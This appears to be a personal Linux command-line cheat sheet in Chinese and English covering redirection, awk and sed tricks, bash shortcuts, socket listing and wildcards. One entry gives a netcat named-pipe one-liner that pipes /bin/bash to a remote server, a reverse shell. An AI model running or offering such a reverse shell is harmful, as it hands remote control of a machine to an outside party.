标准流：重定向与组合 重定向流的例子： ps aux 2>&1 | grep init 这里的数字(文件描述符)代表：
0：stdin
1：stdout
2：sterr
上面的命令中，“grep init”不仅搜索“ps aux”的标准输出，而且搜索 sterr 输出。


$Find broken symlinks
     find -L /path/to/check -type l -delete  
       find -L /path -type l -exec rm -i {} +
     for i in $(file * | grep broken | cut -d : -f 1); do rm $i; done
   symlinks -dr
          -d - delete dangling links
          -r - recursively
# stat , file 

$List your MACs address
     ip link | awk '/link/ {print $2}'
    ifconfig -a | sed '/eth\|wl/!d;s/   Link.*HWaddr//' ;
      ifconfig -a | awk '/HWaddr/ {print $5}' ;

$traceroute and ping combined
     mtr google.com   
          -r -c 100 
          -t

$watch - execute a program periodically, showing output fullscreen
     To watch for mail, you might do
   watch -n 60 from

echo "You can simulate on-screen typing just like in the movies" | pv -qL 10

vim 加密 ： vim  -x  file  或者  :X
     http://vimdoc.sourceforge.net/htmldoc/editing.html#:x
 
#Show apps that use internet connection at the moment. (Multi-Language)
     #for one line per process:
     ss -p | cat
     for established sockets only:
     ss -p | grep STA
     for just process names:
     ss -p | cut -f2 -sd\"
     or     ss -p | grep STA | cut -f2 -d\"
     lsof -P -i -n 
         netstat -lantp | grep -i stab | awk -F/ '{print $2}' | sort | uniq


查找相关命令 ：apropos floppy

Table 5-1: Wildcards

Wildcard Meaning

* Matches any characters

? Matches any single character

[characters] Matches any character that is a member of the set characters

[!characters] Matches any character that is not a member of the set

characters

[[:class:]] Matches any character that is a member of the specified class

 

Table 5-2: Commonly Used Character Classes

Character Class Meaning

[:alnum:] Matches any alphanumeric character

[:alpha:] Matches any alphabetic character

[:digit:] Matches any numeral

[:lower:] Matches any lowercase letter

[:upper:] Matches any uppercase letter

#save to pdf
man -t awk | ps2pdf - awk.pdf

#limit cpu
sudo cpulimit -p <pid> -l 50

#display a block
awk '/start_pattern/,/stop_pattern/' file.txt

# Remove duplicate entries in a file without sorting
awk '!x[$0]++' <file>   #//sort -u file

#run a http file server
python -m SimpleHTTPServer

awk '{print NR": "$0; for(i=1;i<=NF;++i)print "\t"i": "$i}'
echo 0x1134 | awk '{print strtonum($1)}'

#只在指定列搜索
awk '$1 ~ /regexp/' file.txt

#匹配双引号内的字符
grep '"[^"]*"'

#grep only matching
grep -o reg

#Referance backward words:
cp /work/host/phone/ui/main.cpp !#$:s/host/target
 expand to: cp /work/host/phone/ui/main.cpp /work/target/phone/ui/main.cpp

#execute a shell on a server with a netcat binary which doesn't support -e option
mknod backpipe p && nc remote_server 1337 0<backpipe | /bin/bash 1>backpipe

#关于时间
date +%s     seconds since 1970-01-01 00:00:00 UTC
把秒转换为日期  echo 1305608399 | awk '{print strftime("%Y/%m/%d %X", $1)}'
把日期转换为秒  echo a | awk '{print mktime("2011 04 17 23 59 59")}'

#并列显示多个文件 paste
file1：
1
2
3

file2：
a
b
c
paste file1 file2
1 a
2 b
3 c

#把小写转成大写
cat temp | tr [:lower:] [:upper:] 
cat temp | tr [a-z] [A-Z]

#等效
cat t.txt | grep -A 1 outside
cat t.txt | sed '/outside/,+1!d'

#crontab short cmd
man 5 crontab //@reboot

编辑命令

Ctrl + a ：移到命令行首
Ctrl + e ：移到命令行尾
Ctrl + f ：按字符前移（右向）
Ctrl + b ：按字符后移（左向）
Alt + f ：按单词前移（右向）
Alt + b ：按单词后移（左向）
Ctrl + xx：在命令行首和光标之间移动
Ctrl + u ：从光标处删除至命令行首
Ctrl + k ：从光标处删除至命令行尾
Ctrl + w ：从光标处删除至字首
Alt + d ：从光标处删除至字尾
Ctrl + d ：删除光标处的字符
Ctrl + h ：删除光标前的字符
Ctrl + y ：粘贴至光标后
Alt + c ：从光标处更改为首字母大写的单词
Alt + u ：从光标处更改为全部大写的单词
Alt + l ：从光标处更改为全部小写的单词
Ctrl + t ：交换光标处和之前的字符
Alt + t ：交换光标处和之前的单词
Alt + Backspace：与 Ctrl + w 相同类似，分隔符有些差别 [感谢 rezilla 指正]
重新执行命令

Ctrl + r：逆向搜索命令历史
Ctrl + g：从历史搜索模式退出
Ctrl + p：历史中的上一条命令
Ctrl + n：历史中的下一条命令
Alt + .：使用上一条命令的最后一个参数
控制命令

Ctrl + l：清屏
Ctrl + o：执行当前命令，并选择上一条命令
Ctrl + s：阻止屏幕输出
Ctrl + q：允许屏幕输出
Ctrl + c：终止命令
Ctrl + z：挂起命令
Bang (!) 命令

!!：执行上一条命令
!blah：执行最近的以 blah 开头的命令，如 !ls
!blah:p：仅打印输出，而不执行
!$：上一条命令的最后一个参数，与 Alt + . 相同
!$:p：打印输出 !$ 的内容
!*：上一条命令的所有参数
!*:p：打印输出 !* 的内容
^blah：删除上一条命令中的 blah
^blah^foo：将上一条命令中的 blah 替换为 foo
^blah^foo^：将上一条命令中所有的 blah 都替换为 foo



1.合并行

zj@zj:~/Script/blog_script$ cat test1
1
2
3
4
合并上下两行
zj@zj:~/Script/blog_script$ sed '$!N;s/\n/\t/' test1
1    2
3    4
合并匹配模式及其下一行
zj@zj:~/Script/blog_script$ sed '/2/{N;s/\n/\t/}' test1
1
2    3
4
合并所有行
zj@zj:~/Script/blog_script$ sed ':a;N;s/\n/\t/;ba;' test1
1    2    3    4

2.交换行
2.1已知行号时交换两行
zj@zj:~/Script/blog_script$ cat test
baidu music so terrible so bad
microsoft haha haha
yahoo byebye
google princess so good 
这里是交换1,4行.当然你可以根据自己需要修改
zj@zj:~/Script/blog_script$ for(( i=1;i<=4;i++ )); do  case $i in 1) sed -n 4p test;; 4) sed -n 1p test;; *) sed -n ${i}p test;; esac; done
google princess so good 
microsoft haha haha
yahoo byebye
baidu music so terrible so bad
连续时好说:
zj@zj:~/Script/blog_script$ sed '1{h;d};2{G}' test
microsoft haha haha
baidu music so terrible so bad
yahoo byebye
google princess so good 

2.2不知道行号
要交换的两行是连续行的情况下:
zj@zj:~/Script/blog_script$ sed '/baidu/{h;d};/microsoft/{G}' test
microsoft haha haha
baidu music so terrible so bad
yahoo byebye
google princess so good
ps:交换包含bai与microsoft的行
两行不连续的情况:

zj@zj:~/Script/blog_script$ sed '/baidu/{:a;N;/google/!ba;s/\([^\n]*\)\n\(.*\)\n\(.*\)/\3\n\2\n\1/}' test
google princess so good 
microsoft haha haha
yahoo byebye
baidu music so terrible so bad
ps:交换含有baidu与google的行

研究了下写了个不论连续不连续的都可以的:
zj@zj:~/Script/blog_script$ sed '/baidu/{:a;N;/microsoft/!ba;/[^\n]*baidu[^\n]*\n[^\n]*microsoft[^\n]*$/{s/\([^\n]*baidu[^\n]*\)\n\(.*\)/\2\n\1/};s/\([^\n]*\)\n\(.*\)\n\(.*\)/\3\n\2\n\1/}' test
microsoft haha haha
baidu music so terrible so bad
yahoo byebye
google princess so good 

zj@zj:~/Script/blog_script$ sed '/baidu/{:a;N;/google/!ba;/[^\n]*baidu[^\n]*\n[^\n]*google[^\n]*$/{s/\([^\n]*baidu[^\n]*\)\n\(.*\)/\2\n\1/;};s/\([^\n]*\)\n\(.*\)\n\(.*\)/\3\n\2\n\1/}' test
google princess so good 
microsoft haha haha
yahoo byebye
baidu music so terrible so bad

ps:上面代码
/baidu/{....}  遇到含有baidu的行，开始做{}中的命令序列
:a;N;/google/!ba  循环读信息，直到读取google.
/[^\n]*baidu[^\n]*\n[^\n]*google[^\n]*$/这个就是说如果哦baidu与google之间只有一个\n,即这两个是连续行就：{s/\([^\n]*baidu[^\n]*\)\n\(.*\)/\2\n\1/;}交换这两行

如果不匹配上面的模式就是说不是连续行了.
s/\([^\n]*\)\n\(.*\)\n\(.*\)/\3\n\2\n\1/}
而在匹配连续行的情况下是不可能匹配上面表达式的.ok~~~~

3.忘了还有交互奇偶行
zj@zj:~/Script/blog_script$ sed '$!N;s/\([^\n]*\)\n\([^\n]*\)/\2\n\1/' test
microsoft haha haha
baidu music so terrible so bad
google princess so good 
yahoo byebye


#在A.开头加```\n ,然后在D/E/F/G 开头的行和下一行合并，并在他们中间加```

sed -i 's/^[A]\./\`\`\`\n&/;/^[DEFG]\./{N;s/\n/&\`\`\`/}'